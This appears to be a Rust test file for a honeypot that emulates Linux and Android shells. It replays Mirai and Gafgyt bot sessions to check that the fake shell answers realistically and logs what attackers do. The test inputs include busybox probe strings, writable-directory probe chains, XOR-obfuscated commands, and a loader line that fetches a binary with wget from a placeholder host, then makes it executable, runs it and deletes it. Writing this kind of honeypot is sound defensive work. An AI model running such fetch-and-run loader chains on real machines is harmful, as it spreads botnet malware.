//! Unit tests for the shell's handlers and the grammar's end-to-end behavior, driven through
//! `FakeShell::handle_input` the way a session does.

mod echo_tests {
    use crate::fakefs::FakeFs;
    use crate::shell::{EchoDialect, EmitContext, FakeShell};

    /// The bash builtin, the dialect every test below that names no other means.
    fn cmd_echo(args: &[&str]) -> String {
        crate::shell::cmd_echo(EchoDialect::Bash, args)
    }

    fn run(sh: &mut FakeShell, line: &str) -> String {
        sh.handle_input(line).0.to_string()
    }

    fn shell() -> FakeShell {
        FakeShell::new(
            FakeFs::new(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: true,
                protocol_label: "telnet".to_string(),
                session_id: None,
            },
        )
    }

    #[test]
    fn bash_echo_leaves_escapes_alone_without_dash_e() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "echo 'a\\nb'"), "a\\nb\n");
        assert_eq!(run(&mut sh, "echo -e 'a\\nb'"), "a\nb\n");
        assert_eq!(run(&mut sh, "echo -E -e 'a\\nb' -E"), "a\nb -E\n");
    }

    #[test]
    fn dash_echo_interprets_escapes_without_dash_e() {
        // Captured on Ubuntu 22.04: `dash -c "echo '\101\xff'"` printed `A\xff` (octal decoded,
        // hex not) and `dash -c "echo -e '\101'"` printed `-e A`.
        assert_eq!(
            crate::shell::cmd_echo(EchoDialect::Dash, &["\\101\\xff"]),
            "A\\xff\n"
        );
        assert_eq!(
            crate::shell::cmd_echo(EchoDialect::Dash, &["-e", "\\101"]),
            "-e A\n"
        );
        assert_eq!(
            crate::shell::cmd_echo(EchoDialect::Dash, &["a\\tb\\0101"]),
            "a\tbA\n"
        );
    }

    #[test]
    fn only_an_exact_dash_n_is_a_flag_in_dash() {
        let dash = |args: &[&str]| crate::shell::cmd_echo(EchoDialect::Dash, args);
        assert_eq!(dash(&["-n", "hi"]), "hi");
        assert_eq!(dash(&["-en", "hi"]), "-en hi\n");
        assert_eq!(dash(&["-E", "hi"]), "-E hi\n");
        assert_eq!(dash(&["-n", "-n", "x"]), "-n x");
        assert_eq!(dash(&["a\\cb", "z"]), "a");
    }

    #[test]
    fn the_active_shell_level_picks_the_echo() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "echo '\\101'"), "\\101\n");
        assert_eq!(run(&mut sh, "sh"), "");
        assert_eq!(run(&mut sh, "echo '\\101'"), "A\n");
        assert_eq!(run(&mut sh, "echo -e x"), "-e x\n");
        assert_eq!(run(&mut sh, "exit"), "");
        assert_eq!(run(&mut sh, "echo '\\101'"), "\\101\n");
    }

    #[test]
    fn dash_script_level_uses_dash_echo() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "sh -c \"echo '\\\\101'\""), "A\n");
    }

    #[test]
    fn busybox_echo_takes_dash_e_and_dash_n() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "sh"), "");
        assert_eq!(run(&mut sh, "busybox echo -e '\\x51\\x4a\\x4c'"), "QJL\n");
        assert_eq!(run(&mut sh, "busybox echo -ne '\\x51'"), "Q");
        assert_eq!(run(&mut sh, "busybox echo '\\x51'"), "\\x51\n");
    }

    #[test]
    fn gafgyt_handshake_answers_from_the_login_shell_and_from_busybox() {
        let mut sh = shell();
        let probe = "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"";
        assert_eq!(run(&mut sh, probe), "GAYFGT\n");
        assert_eq!(run(&mut sh, &format!("busybox {probe}")), "GAYFGT\n");
    }

    #[test]
    fn gafgyt_handshake_returns_gayfgt() {
        // The exact probe Gafgyt/BASHLITE sends, as the arguments echo receives once the shell
        // has removed the quotes: `echo` `-e` `\x47\x41\x59\x46\x47\x54`. It must read back
        // "GAYFGT" or the bot hangs up.
        let out = cmd_echo(&["-e", "\\x47\\x41\\x59\\x46\\x47\\x54"]);
        assert_eq!(out, "GAYFGT\n");
    }

    #[test]
    fn echo_prints_the_quotes_it_is_given_because_the_shell_already_removed_its_own() {
        assert_eq!(cmd_echo(&["\"hello\""]), "\"hello\"\n");
    }

    #[test]
    fn without_dash_e_escapes_stay_literal() {
        // Default (no -e) and explicit -E both leave backslash escapes untouched.
        assert_eq!(cmd_echo(&["\\x47"]), "\\x47\n");
        assert_eq!(cmd_echo(&["-E", "\\x47"]), "\\x47\n");
    }

    #[test]
    fn dash_n_suppresses_the_trailing_newline() {
        assert_eq!(cmd_echo(&["-n", "hi"]), "hi");
        assert_eq!(cmd_echo(&["-en", "\\x41"]), "A");
    }

    #[test]
    fn decodes_hex_and_octal_escapes_under_dash_e() {
        assert_eq!(cmd_echo(&["-e", "\\x41\\x42"]), "AB\n"); // hex
        assert_eq!(cmd_echo(&["-e", "\\0101"]), "A\n"); // octal 101 = 'A'
        assert_eq!(cmd_echo(&["-e", "a\\tb"]), "a\tb\n"); // tab
    }

    #[test]
    fn dash_c_stops_output_including_newline() {
        assert_eq!(cmd_echo(&["-e", "ab\\cd"]), "ab");
    }

    #[test]
    fn multiple_operands_join_with_single_spaces() {
        assert_eq!(cmd_echo(&["a", "b", "c"]), "a b c\n");
    }

    #[test]
    fn bare_echo_prints_only_a_newline() {
        assert_eq!(cmd_echo(&[]), "\n");
    }
}

mod shell_detection_tests {
    use crate::fakefs::FakeFs;
    use crate::shell::{
        BUSYBOX_APPLETS, EmitContext, FakeShell, OutputFd, SIGNAL_HONEYPOT_FILE_DOWNLOAD,
        busybox_banner, cmd_curl, cmd_uname, cmd_wget, download_target, is_busybox_applet, onlcr,
        simple_commands, url_if_fetch_line,
    };

    fn shell() -> FakeShell {
        FakeShell::new(
            FakeFs::new(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: true,
                protocol_label: "telnet".to_string(),
                session_id: None,
            },
        )
    }

    fn exec_shell() -> FakeShell {
        FakeShell::exec(
            FakeFs::new(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: true,
                protocol_label: "ssh".to_string(),
                session_id: None,
            },
        )
    }

    #[test]
    fn login_identity_controls_prompt_argv_zero_and_errors() {
        let mut sh = shell();
        assert_eq!(
            sh.prompt(),
            format!("root@{}:~# ", crate::persona::hostname())
        );
        assert_eq!(sh.handle_input("echo $0").0, "-bash\n");
        assert_eq!(
            sh.handle_input("nosuchcmd_q").0,
            "nosuchcmd_q: command not found\n"
        );
        assert_eq!(
            sh.handle_input("system").0,
            "Command 'system' not found, did you mean:\n  command 'system3' from deb simh (3.8.1-6.1)\n  command 'systemd' from deb systemd (249.11-0ubuntu3.21)\nTry: apt install <deb name>\n"
        );
        assert_eq!(
            sh.handle_input("ifconfig").0,
            "Command 'ifconfig' not found, but can be installed with:\napt install net-tools\n"
        );
        assert_eq!(
            sh.handle_input("cd /missing_q").0,
            "-bash: cd: /missing_q: No such file or directory\n"
        );
        assert_eq!(sh.handle_input("cd /tmp").0, "");
        assert_eq!(
            sh.prompt(),
            format!("root@{}:/tmp# ", crate::persona::hostname())
        );
    }

    #[test]
    fn exec_context_has_no_prompt_and_uses_bash_line_one_errors() {
        let mut sh = exec_shell();
        assert_eq!(sh.prompt(), "");
        assert_eq!(sh.handle_input("echo $0").0, "bash\n");
        assert_eq!(
            sh.handle_input("nosuchcmd_q").0,
            "bash: line 1: nosuchcmd_q: command not found\n"
        );
        assert_eq!(
            sh.handle_input("cd /missing_q").0,
            "bash: line 1: cd: /missing_q: No such file or directory\n"
        );
    }

    #[test]
    fn nested_dash_levels_keep_independent_line_numbers() {
        let mut sh = shell();
        assert_eq!(sh.handle_input("sh").0, "");
        assert_eq!(sh.prompt(), "# ");
        assert_eq!(sh.handle_input("echo $0").0, "sh\n");
        assert_eq!(
            sh.handle_input("outer_missing").0,
            "sh: 2: outer_missing: not found\n"
        );

        assert_eq!(sh.handle_input("sh").0, "");
        assert_eq!(
            sh.handle_input("inner_missing").0,
            "sh: 1: inner_missing: not found\n"
        );
        let (inner_exit, _) = sh.handle_input("exit");
        assert_eq!(inner_exit, "");
        assert!(!inner_exit.close_session);
        assert_eq!(sh.prompt(), "# ");
        assert_eq!(
            sh.handle_input("outer_again").0,
            "sh: 4: outer_again: not found\n"
        );

        let (outer_exit, _) = sh.handle_input("exit");
        assert_eq!(outer_exit, "");
        assert!(!outer_exit.close_session);
        assert_eq!(
            sh.prompt(),
            format!("root@{}:~# ", crate::persona::hostname())
        );
    }

    #[test]
    fn nested_bash_logout_fails_and_exit_returns_to_login_shell() {
        let mut sh = shell();
        assert_eq!(sh.handle_input("su").0, "");
        assert_eq!(sh.handle_input("echo $0").0, "bash\n");
        let (logout, _) = sh.handle_input("logout");
        assert_eq!(logout.status, 1);
        assert_eq!(logout, "bash: logout: not login shell: use `exit'\n");

        let (nested_exit, _) = sh.handle_input("exit");
        assert_eq!(nested_exit, "exit\n");
        assert!(!nested_exit.close_session);
        assert_eq!(sh.handle_input("echo $0").0, "-bash\n");

        let (login_exit, _) = sh.handle_input("exit; echo must_not_run");
        assert_eq!(login_exit, "logout\n");
        assert!(login_exit.close_session);
    }

    fn xor(s: &str, key: u8) -> String {
        String::from_utf8(crate::command_codec::xor_bytes(s, key)).unwrap()
    }

    /// A loader's writable-directory probe as seen in a live session: create an empty file, make
    /// it executable, run it, and only then move there. The run used to be "command not found",
    /// so the `cd` never happened; the trailing slash on the `cd` was refused too.
    #[test]
    fn writable_directory_probe_runs_the_created_file_and_changes_directory() {
        let mut sh = shell();
        let (out, _) = sh.handle_input(">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/");
        assert_eq!(out, "", "every step of the probe succeeds silently");
        assert_eq!(sh.handle_input("pwd").0, "/tmp\n");
        // Without the chmod the file is not runnable, and a path that does not exist is a
        // missing file, not a missing command.
        let mut fresh = shell();
        fresh.handle_input(">/tmp/e");
        assert_eq!(
            fresh.handle_input("/tmp/e").0,
            "-bash: /tmp/e: Permission denied\n"
        );
        assert_eq!(
            fresh.handle_input("/tmp/nothere").0,
            "-bash: /tmp/nothere: No such file or directory\n"
        );
        assert_eq!(
            fresh.handle_input("/tmp").0,
            "-bash: /tmp: Is a directory\n"
        );
        fresh.handle_input("chmod +x /tmp/e");
        assert_eq!(fresh.handle_input("/tmp/e").0, "");
        assert!(crate::shell::mode_grants_execute("755"));
        assert!(crate::shell::mode_grants_execute("0755"));
        assert!(!crate::shell::mode_grants_execute("644"));
        assert!(crate::shell::mode_grants_execute("a+x"));
        assert!(!crate::shell::mode_grants_execute("-x"));
    }

    /// The whole attacker session observed live on 2026-09-06, replayed in order through one
    /// shell: the Mirai telnet preamble, the two busybox probes, the writable-directory chains,
    /// and a loader stage. Every reply, the working directory and the emitted events are
    /// checked, so a line that regresses is caught here even when its own unit test still
    /// passes. Extend this when a new session line is observed; do not add a narrower test
    /// instead.
    #[test]
    fn observed_session_2026_09_06_replays_end_to_end() {
        let mut sh = shell();
        let mut command_events = 0usize;
        let mut download_urls: Vec<String> = Vec::new();
        let mut run = |sh: &mut FakeShell, line: &str| -> String {
            let (out, events) = sh.handle_input(line);
            for e in &events {
                match e.signal_type.as_str() {
                    sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC => command_events += 1,
                    sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD => download_urls
                        .push(e.metadata["url"].as_str().unwrap_or_default().to_string()),
                    _ => {}
                }
            }
            out.to_string()
        };

        // Preamble: bash lists its builtins for `enable`; `system`, `shell` and `linuxshell` do
        // not exist on bash; `sh` opens a nested shell silently.
        let out = run(&mut sh, "enable");
        assert!(
            out.contains("enable cd\n") && !out.contains("not found"),
            "{out}"
        );
        assert!(run(&mut sh, "system").starts_with("Command 'system' not found, did you mean:"));
        assert!(run(&mut sh, "shell").starts_with("Command 'shell' not found, did you mean:"));
        assert_eq!(
            run(&mut sh, "linuxshell"),
            "linuxshell: command not found\n"
        );
        assert_eq!(run(&mut sh, "sh"), "");

        // Probes on one line: the listing then the applet reply, in order.
        assert_eq!(
            run(&mut sh, "ls /home; /bin/busybox BOTNET"),
            "ubuntu\nBOTNET: applet not found\n"
        );
        let out = run(&mut sh, "cat /proc/mounts; /bin/busybox URUMV");
        assert!(out.contains("/dev/sda1 / ext4 "), "{out}");
        assert!(out.ends_with("URUMV: applet not found\n"), "{out}");

        // Writable-directory chains: the marker prints and the shell is left where the chain
        // ended.
        let out = run(
            &mut sh,
            ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;\
             >/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;\
             /bin/busybox echo -e '\\x51\\x4a\\x4c\\x58\\x54\\x4b'",
        );
        assert_eq!(out, "QJLXTK\n");
        assert_eq!(run(&mut sh, "pwd"), "/var\n");
        assert_eq!(
            run(&mut sh, ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/"),
            ""
        );
        assert_eq!(run(&mut sh, "pwd"), "/tmp\n");

        // Loader stage: fetch to a file, make it executable, run it, delete it. Each step
        // depends on what the one before left behind, so the replies are asserted exactly. A
        // check for the absence of "not found" passed while `./x86` answered "No such file or
        // directory", which is why the chain broke here unnoticed.
        let out = run(
            &mut sh,
            "/bin/busybox wget http://198.51.100.9/bins/x86 -O x86; chmod 777 x86; ./x86; rm -rf x86",
        );
        assert!(out.starts_with("--"), "wget prints its transcript: {out}");
        assert!(out.contains("Saving to: 'x86'"), "{out}");
        assert!(out.trim_end().ends_with("saved [1234/1234]"), "{out}");
        assert!(
            !out.contains("No such file") && !out.contains("Permission denied"),
            "every step found what the step before left: {out}"
        );
        assert_eq!(
            run(&mut sh, "ls /tmp"),
            "d\n",
            "the payload was removed and the probe file stays hidden"
        );
        assert_eq!(download_urls, vec!["http://198.51.100.9/bins/x86"]);
        assert_eq!(command_events, 13, "one command event per session line");
    }

    /// ADB is Android's own protocol, and the sensor announces a Nexus 5. The shell behind it
    /// answered as an Ubuntu bash on server01, which a bot confirms with one command. This is
    /// the same session an ADB dropper runs, answered as the device.
    #[test]
    fn the_adb_shell_answers_as_the_android_device_it_announces() {
        let mut sh = FakeShell::android(
            FakeFs::android(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: false,
                protocol_label: "adb".to_string(),
                session_id: None,
            },
        );
        // An `adb shell` session starts at /, not in a Linux server's /root.
        assert_eq!(sh.cwd(), "/");
        assert_eq!(sh.prompt(), crate::persona::android_root_prompt("/"));
        assert_eq!(sh.handle_input("echo $0").0, "sh\n");
        assert_eq!(sh.handle_input("pwd").0, "/\n");
        assert_eq!(
            sh.handle_input("uname -a").0,
            format!("{}\n", crate::persona::android_uname_all())
        );
        assert_eq!(sh.handle_input("uname -m").0, "armv7l\n");
        assert_eq!(sh.handle_input("uname -o").0, "Android\n");
        assert!(
            !sh.handle_input("uname -a").0.contains("Ubuntu"),
            "the phone must not report the server's kernel"
        );
        // mksh, not bash: the message an unknown command gets is different, and bots read it.
        assert_eq!(sh.handle_input("foobarbaz").0, "sh: foobarbaz: not found\n");
        assert!(!sh.handle_input("foobarbaz").0.contains("bash"));
        // The device's own files answer, and the server's are absent.
        assert!(
            sh.handle_input("cat /system/build.prop")
                .0
                .contains(crate::persona::ANDROID_MODEL)
        );
        assert!(
            sh.handle_input("cat /default.prop")
                .0
                .contains("ro.secure=0")
        );
        assert_eq!(
            sh.handle_input("cat /etc/os-release").0,
            "cat: /etc/os-release: No such file or directory\n"
        );
        // The drop directories work and /system refuses writes, as on a real device.
        assert_eq!(sh.handle_input("cd /data/local/tmp").0, "");
        assert_eq!(sh.cwd(), "/data/local/tmp");
        assert_eq!(sh.handle_input(">payload && chmod 777 payload").0, "");
        assert_eq!(sh.handle_input("./payload").0, "");
        assert_eq!(
            sh.handle_input(">/system/bin/payload").0,
            "sh: /system/bin/payload: Read-only file system\n"
        );
        // Busybox is there because the device is rooted, so a loader chain still runs.
        assert_eq!(
            sh.handle_input("/system/bin/sh").0,
            "",
            "the device's own shell is present"
        );
        assert!(
            sh.handle_input("busybox ABCDEF")
                .0
                .contains("applet not found")
        );
        let (nested_exit, _) = sh.handle_input("exit");
        assert!(!nested_exit.close_session);
        let (outer_exit, _) = sh.handle_input("exit");
        assert!(outer_exit.close_session);
    }

    /// `cp`, `rm` and `mkdir` answered silent success while changing nothing, so a payload
    /// copied somewhere was not there afterwards and a file the shell said it deleted was still
    /// readable. Each now changes what the rest of the session sees, and reports the errors the
    /// real commands report.
    #[test]
    fn cp_rm_and_mkdir_change_the_filesystem_the_session_sees() {
        let mut sh = shell();
        sh.handle_input(">/tmp/payload");
        sh.handle_input("chmod +x /tmp/payload");

        // cp copies content and the executable bit; into a directory it keeps the name.
        assert_eq!(sh.handle_input("cp /tmp/payload /var/tmp/copy").0, "");
        assert_eq!(sh.handle_input("/var/tmp/copy").0, "", "the copy runs too");
        assert_eq!(sh.handle_input("cp /tmp/payload /mnt").0, "");
        assert_eq!(sh.handle_input("ls /mnt").0, "payload\n");
        assert_eq!(
            sh.handle_input("cp /tmp/absent /tmp/x").0,
            "cp: cannot stat '/tmp/absent': No such file or directory\n"
        );

        // mkdir creates a directory cd and ls accept; -p is quiet about one that exists.
        assert_eq!(sh.handle_input("mkdir /tmp/stage").0, "");
        assert_eq!(sh.handle_input("cd /tmp/stage").0, "");
        assert_eq!(sh.handle_input("pwd").0, "/tmp/stage\n");
        assert_eq!(
            sh.handle_input("mkdir /tmp/stage").0,
            "mkdir: cannot create directory '/tmp/stage': File exists\n"
        );
        assert_eq!(sh.handle_input("mkdir -p /tmp/stage/a/b").0, "");
        assert_eq!(sh.handle_input("cd /tmp/stage/a/b").0, "");
        assert_eq!(
            sh.handle_input("mkdir /tmp/absent/deep").0,
            "mkdir: cannot create directory '/tmp/absent/deep': No such file or directory\n"
        );

        // rm removes for real, refuses a directory without -r, and -f is quiet about a miss.
        assert_eq!(sh.handle_input("cd /tmp").0, "");
        assert_eq!(sh.handle_input("rm payload").0, "");
        assert_eq!(
            sh.handle_input("cat /tmp/payload").0,
            "cat: /tmp/payload: No such file or directory\n"
        );
        assert_eq!(
            sh.handle_input("/tmp/payload").0,
            "-bash: /tmp/payload: No such file or directory\n",
            "a removed file stops being executable"
        );
        assert_eq!(
            sh.handle_input("rm /tmp/payload").0,
            "rm: cannot remove '/tmp/payload': No such file or directory\n"
        );
        assert_eq!(sh.handle_input("rm -f /tmp/payload").0, "");
        assert_eq!(
            sh.handle_input("rm /tmp/stage").0,
            "rm: cannot remove '/tmp/stage': Is a directory\n"
        );
        assert_eq!(sh.handle_input("rm -rf /tmp/stage").0, "");
        assert_eq!(
            sh.handle_input("cd /tmp/stage").0,
            "-bash: cd: /tmp/stage: No such file or directory\n"
        );
        // A baked-in file can be removed too: saying nothing and keeping it contradicts the rm.
        assert_eq!(sh.handle_input("rm /etc/hostname").0, "");
        assert_eq!(
            sh.handle_input("cat /etc/hostname").0,
            "cat: /etc/hostname: No such file or directory\n"
        );
    }

    /// A fetch that saves to a file leaves that file behind, so the `chmod` and `./payload` a
    /// loader runs next work; one that prints to stdout leaves nothing, as the real one does.
    #[test]
    fn a_saved_download_exists_afterwards_and_a_streamed_one_does_not() {
        let mut sh = shell();
        sh.handle_input("cd /tmp");
        sh.handle_input("wget http://198.51.100.9/bins/x86");
        assert_eq!(
            sh.handle_input("ls /tmp").0,
            "x86\n",
            "saved under its name"
        );
        assert_eq!(
            sh.handle_input("cat /tmp/x86").0,
            crate::shell::FETCHED_BODY,
            "the saved file holds the body the fetch claimed"
        );
        sh.handle_input("curl -o boot.sh http://198.51.100.9/boot");
        assert_eq!(sh.handle_input("ls /tmp").0, "boot.sh  x86\n");
        sh.handle_input("busybox tftp -g -r arm7 198.51.100.9");
        assert_eq!(sh.handle_input("ls /tmp").0, "arm7  boot.sh  x86\n");
        // Streamed to stdout (the `| sh` pattern): nothing is written.
        sh.handle_input("wget -qO- http://198.51.100.9/one");
        sh.handle_input("curl http://198.51.100.9/two");
        assert_eq!(sh.handle_input("ls /tmp").0, "arm7  boot.sh  x86\n");
    }

    /// Observed live (2026-09-06): `cat /proc/mounts; /bin/busybox URUMV`. The box answered
    /// "No such file or directory" for a file every Linux has.
    #[test]
    fn proc_mounts_is_readable_and_agrees_with_the_mount_command() {
        let mut sh = shell();
        let (out, _) = sh.handle_input("cat /proc/mounts; /bin/busybox URUMV");
        assert!(
            out.contains("/dev/sda1 / ext4 rw,relatime,discard,errors=remount-ro 0 0\n"),
            "{out}"
        );
        assert!(out.ends_with("URUMV: applet not found\n"), "{out}");
        let (mount, _) = sh.handle_input("mount");
        assert!(
            mount.contains("/dev/sda1 on / type ext4 (rw,relatime,discard,errors=remount-ro)\n"),
            "{mount}"
        );
        assert_eq!(
            mount.lines().count(),
            out.lines().count() - 1,
            "mount lists exactly the table /proc/mounts exposes"
        );
        assert_eq!(
            sh.handle_input("cat /etc/mtab").0,
            sh.handle_input("cat /proc/self/mounts").0
        );
        assert_eq!(
            sh.handle_input("cd /sys/fs/cgroup").0,
            "",
            "a listed mount point is a directory"
        );
        assert_eq!(sh.handle_input("mount -t tmpfs tmpfs /mnt").0, "");
    }

    #[test]
    fn xor_obfuscated_command_is_decoded_dispatched_and_annotated() {
        let mut sh = shell();
        // The first obfuscated anchor ("enable" ^ 0x09) locks the session key.
        sh.handle_input(xor("enable", 0x09));
        // The obfuscated busybox probe now decodes and reaches the grammar.
        let probe_obf = xor("/bin/busybox LZRD", 0x09);
        let (out, events) = sh.handle_input(&probe_obf);
        assert!(
            out.contains("LZRD: applet not found"),
            "decoded probe must get the busybox applet reply, got {out:?}"
        );
        assert_eq!(events[0].metadata["command"], probe_obf); // raw bytes preserved verbatim
        assert_eq!(events[0].metadata["command_decoded"], "/bin/busybox LZRD");
        assert_eq!(events[0].metadata["xor_key"], 9);
    }

    #[test]
    fn plaintext_command_has_no_decoded_annotation() {
        let (_out, events) = shell().handle_input("uname -a");
        assert_eq!(events[0].metadata["command"], "uname -a");
        assert!(events[0].metadata.get("command_decoded").is_none());
        assert!(events[0].metadata.get("xor_key").is_none());
    }

    #[test]
    fn binary_flood_emits_one_marker_event_not_one_per_line() {
        // A channel streaming binary (an SSH IP produced >20k such "command" events) must not add
        // one ledger event per garbage line.
        let mut sh = shell();
        let garbage = "\u{FFFD}".repeat(40);

        let (_out, first) = sh.handle_input(&garbage);
        assert_eq!(
            first.len(),
            1,
            "the first binary line emits a single marker"
        );
        assert_eq!(first[0].metadata["flood"], "binary");

        let mut more = 0;
        for _ in 0..100 {
            more += sh.handle_input(&garbage).1.len();
        }
        assert_eq!(more, 0, "subsequent binary lines emit no further events");
    }

    #[test]
    fn command_flood_is_capped_to_one_marker_past_the_per_session_limit() {
        let cap = crate::shell::MAX_COMMANDS_PER_SESSION;
        let mut sh = shell();
        let mut total = 0;
        for i in 0..(cap + 50) {
            total += sh.handle_input(format!("cmd{i}")).1.len();
        }
        // `cap` real command events + exactly one cap marker; never one per line.
        assert_eq!(total, cap as usize + 1);
    }

    #[test]
    fn a_normal_fetch_command_still_emits_its_command_and_download_events() {
        let (_out, events) = shell().handle_input("wget http://198.51.100.9/x");
        assert_eq!(
            events.len(),
            2,
            "a fetch emits the command event + the download event"
        );
        assert!(events.iter().any(|e| e.metadata.get("url").is_some()));
    }

    #[test]
    fn encode_output_mirrors_after_a_command_locks_the_key() {
        let mut sh = shell();
        sh.handle_input(xor("enable", 0x09)); // an obfuscated command locks 0x09
        assert_eq!(sh.encode_output(b"# "), xor("# ", 0x09).into_bytes());
        // A plaintext session leaves output unchanged.
        let mut plain = shell();
        plain.handle_input("uname");
        assert_eq!(plain.encode_output(b"# "), b"# ".to_vec());
    }

    #[test]
    fn bin_busybox_path_form_gets_the_applet_reply() {
        // The full-path probe the LZRD variant sends must resolve like a bare `busybox` invocation.
        let (out, _) = shell().handle_input("/bin/busybox LZRD");
        assert!(out.contains("LZRD: applet not found"), "got {out:?}");
    }

    #[test]
    fn cat_proc_self_cmdline_returns_the_reading_process_argv() {
        // Every real Linux has /proc/self/cmdline; a "No such file or directory" is a honeypot tell
        // some Mirai/Gafgyt loaders check before delivering a payload. /proc/self is the `cat`
        // process, so it returns cat's own argv, NUL-separated with a trailing NUL and no newline.
        let (out, _) = shell().handle_input("cat /proc/self/cmdline");
        assert_eq!(out, "cat\0/proc/self/cmdline\0");
    }

    #[test]
    fn cd_proc_then_cat_relative_cmdline_resolves_against_cwd() {
        // The observed bot ran `cd /proc && cat self/cmdline`; the relative path must resolve.
        let mut sh = shell();
        sh.handle_input("cd /proc");
        let (out, _) = sh.handle_input("cat self/cmdline");
        assert_eq!(out, "cat\0self/cmdline\0");
    }

    #[test]
    fn cat_relative_file_resolves_against_cwd() {
        let mut sh = shell();
        sh.handle_input("cd /etc");
        let (out, _) = sh.handle_input("cat hostname");
        assert!(out.contains("server01"), "got: {out:?}");
    }

    #[test]
    fn sh_is_never_command_not_found() {
        // Every real system has /bin/sh; "command not found" would out the honeypot instantly.
        let (out, events) = shell().handle_input("sh");
        assert_eq!(out, "");
        assert_eq!(events.len(), 1); // command_exec only, no spurious download
    }

    /// Observed live 2026-09-06: a Mirai scanner sent `ls /home; /bin/busybox BOTNET` as ONE line.
    /// The shell dispatched the whole line as `ls` with `/home;` as its argument, answered
    /// "cannot access '/home;'", and the busybox probe never ran - so the loader never saw the
    /// "applet not found" reply it gates its download stage on, and left. A real shell runs each
    /// command in turn.
    #[test]
    fn semicolon_separated_commands_each_run_and_the_busybox_gate_still_answers() {
        let (out, events) = shell().handle_input("ls /home; /bin/busybox BOTNET");
        assert!(
            out.contains("ubuntu"),
            "ls /home must list the home dir: {out:?}"
        );
        assert!(
            out.ends_with("BOTNET: applet not found\n"),
            "the busybox probe after the `;` must run and answer: {out:?}"
        );
        assert!(!out.contains("cannot access"), "{out:?}");
        assert_eq!(
            events.len(),
            1,
            "still one command_exec event per input line"
        );
    }

    #[test]
    fn cd_then_pwd_on_one_line_sees_the_new_directory() {
        let (out, _) = shell().handle_input("cd /tmp; pwd");
        assert_eq!(out, "/tmp\n");
    }

    #[test]
    fn and_and_or_short_circuit_on_the_previous_outcome() {
        let (out, _) = shell().handle_input("nosuchcmd && echo ran");
        assert!(
            !out.contains("ran"),
            "&& after a failure must not run: {out:?}"
        );
        let (out, _) = shell().handle_input("nosuchcmd || echo fallback");
        assert!(
            out.ends_with("fallback\n"),
            "|| after a failure must run: {out:?}"
        );
        let (out, _) = shell().handle_input("id && echo ok");
        assert!(out.contains("uid=0") && out.ends_with("ok\n"), "{out:?}");
    }

    #[test]
    fn explicit_status_controls_lists_without_reading_output_words() {
        let (out, _) = shell().handle_input("echo not found && echo continued");
        assert_eq!(out, "not found\ncontinued\n");
        assert_eq!(out.status, 0);

        let (out, _) = shell().handle_input("false && echo skipped || echo fallback");
        assert_eq!(out, "fallback\n");
        assert_eq!(out.status, 0);

        let (out, _) = shell().handle_input("true || echo skipped");
        assert_eq!(out, "");
        assert_eq!(out.status, 0);
    }

    #[test]
    fn command_result_keeps_ordered_stdout_and_stderr_segments() {
        let (out, _) = shell().handle_input("nosuchcmd; echo recovered");
        assert_eq!(out.status, 0, "the final command decides the list status");
        assert_eq!(out.bytes(), b"nosuchcmd: command not found\nrecovered\n");
        assert_eq!(out.output.len(), 2);
        assert_eq!(out.output[0].fd, OutputFd::Stderr);
        assert_eq!(out.output[1].fd, OutputFd::Stdout);

        let (failed, _) = shell().handle_input("nosuchcmd");
        assert_eq!(failed.status, 127);
        assert_eq!(failed.output[0].fd, OutputFd::Stderr);
    }

    #[test]
    fn modeled_failures_carry_their_real_exit_statuses() {
        let mut sh = shell();
        let cases = [
            ("/bin/busybox ECCHI", 127),
            ("false", 1),
            ("nosuchcmd_q", 127),
            ("/tmp", 126),
            ("/tmp/missing_q", 127),
            ("cat /missing_q", 1),
            ("ls /missing_q", 2),
            ("cd /missing_q", 1),
            ("cp", 1),
            ("rm", 1),
            ("mkdir", 1),
            ("> /missing_q/x", 1),
        ];
        for (line, expected) in cases {
            let (out, _) = sh.handle_input(line);
            assert_eq!(out.status, expected, "{line}: {out:?}");
            if !out.is_empty() {
                assert_eq!(out.output[0].fd, OutputFd::Stderr, "{line}: {out:?}");
            }
        }

        assert_eq!(sh.handle_input(">/tmp/np").0.status, 0);
        assert_eq!(sh.handle_input("/tmp/np").0.status, 126);
        assert_eq!(sh.handle_input("mkdir /tmp/existing").0.status, 0);
        assert_eq!(sh.handle_input("mkdir /tmp/existing").0.status, 1);
    }

    #[test]
    fn onlcr_maps_newlines_without_decoding_bytes() {
        assert_eq!(onlcr(b"a\n\0\xffb\n"), b"a\r\n\0\xffb\r\n");
        assert_eq!(onlcr(b"\r\n"), b"\r\r\n");
    }

    /// Observed live 2026-09-06, verbatim: a loader probing for a writable directory before
    /// choosing a drop location, then printing the marker it keys its next stage on.
    #[test]
    fn writable_directory_probe_chain_reaches_the_busybox_marker() {
        let mut sh = shell();
        let (out, events) = sh.handle_input(
            ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;\
             >/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;\
             /bin/busybox echo -e '\\x51\\x4a\\x4c\\x58\\x54\\x4b'",
        );
        assert_eq!(
            out, "QJLXTK\n",
            "every probe silent, then exactly the marker"
        );
        assert_eq!(sh.cwd(), "/var", "the last successful `&& cd` wins");
        assert_eq!(events.len(), 1, "one command_exec for the line");
        assert_eq!(
            events[0].signal_type,
            sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC,
            "no download event: the line retrieves nothing"
        );
    }

    #[test]
